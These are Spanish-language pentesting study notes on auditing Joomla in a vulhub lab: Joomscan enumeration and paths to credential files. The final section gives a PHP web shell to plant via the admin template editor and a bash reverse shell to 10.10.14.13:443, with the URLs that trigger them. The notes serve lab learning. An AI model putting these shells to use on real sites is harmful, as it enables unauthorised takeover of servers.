# Joomla 

Tags: #Joomla #CMS  

## Enumeración de gestores de contenido (CMS) – Joomla

Joomla es un sistema de gestión de contenidos (CMS) de código abierto que se utiliza para **crear sitios web** y **aplicaciones en línea**. Joomla es muy popular debido a su facilidad de uso y flexibilidad, lo que lo hace una opción popular para sitios web empresariales, gubernamentales y de organizaciones sin fines de lucro.

Joomla es altamente personalizable y cuenta con una gran cantidad de extensiones disponibles, lo que permite a los usuarios añadir funcionalidades adicionales a sus sitios web sin necesidad de conocimientos de programación avanzados. Joomla también cuenta con una comunidad activa de desarrolladores y usuarios que comparten sus conocimientos y recursos para mejorar el CMS.

A continuación, se comparte el enlace del proyecto que estaremos desplegando en Docker para auditar un Joomla:

-   **CVE-2015-8562**: [Joomla](https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562)

Una de las herramientas que usamos en esta clase es **Joomscan**. Joomscan es una herramienta de línea de comandos diseñada específicamente para escanear sitios web que utilizan Joomla y buscar posibles vulnerabilidades y debilidades de seguridad.

Joomscan utiliza una variedad de técnicas de enumeración para identificar información sobre el sitio web de Joomla, como la versión de Joomla utilizada, los plugins y módulos instalados y los usuarios registrados en el sitio. También utiliza una base de datos de vulnerabilidades conocidas para buscar posibles vulnerabilidades en la instalación de Joomla.

Para utilizar Joomscan, primero debemos descargar la herramienta desde su sitio web oficial. A continuación se os proporciona el enlace al proyecto:

-   **Joomscan**: [https://github.com/OWASP/joomscan](https://github.com/OWASP/joomscan)

## Joomla Enumeración 

Esta herramienta además de enumerar un servidor Joomla, nos crea un reporte de las vulnerabilidades que encontró.
**/administrator** Es la ruta del panel de autenticacion de admin

```bash 
❯ perl joomscan.pl -u http://IP/             # Tool para enumerar Joomla

❯ https://github.com/joomla/joomla-cms       # Enumerar Joomla 
```

## Archivos y rutas típicas por consola

```python 
/var/www/html/         # Ruta donde se encuentra

/configuration.php     # Archivo principal con credenciales de la base de datos
/etc/mysql/my.cnf      # Configuración de MySQL. Puede revelar contraseñas o accesos alternos

/plugins               # Plugins (autenticación, contenido, etc.). Algunos desactualizados pueden ser explotables
/templates             # Temas. Algunos permiten subir archivos o editar código PHP directamente
```

## Obtener una Shell en Joomla

```bash 
1. Para obtener una shell en Joomla se puede lograr de la siguiente manera, editando un 'template' del panel de admin y escribir codigo 'PHP' para ejecutar comandos, debemos de saber la ruta en donde se encuentra instalado el template, ya que ahi podremos ejecutar comandos '?cmd=whoami'


Opcion 1. Editar cualquier template 

1. Seleccionar un template y darle en 'New File'. Despues, colocar un nombre, agregar la extension de 'PHP', dar en 'Create' y colocar el siguiente codigo:
	<?php 
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
		

o de la siguiente manera para obtener la ReverShell directa:

	<?php
	   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")


2. En la siguiente URL se puede acceder al archivo: 

❯ http://IP/templates/protostar/pwned.php?cmd=whoami       # Ejecutar un comando
	# URL-encodeamos la revershell y la colocamos en la url (bash -c 'bash -i >& /dev/tcp/IP/443 0>&1')
❯ http://IP/templates/protostar/pwned.php                  # Llamar al archivo para obtener la ReverShell 

Notas:
	1. Terminar el comando de PHP '?>'
```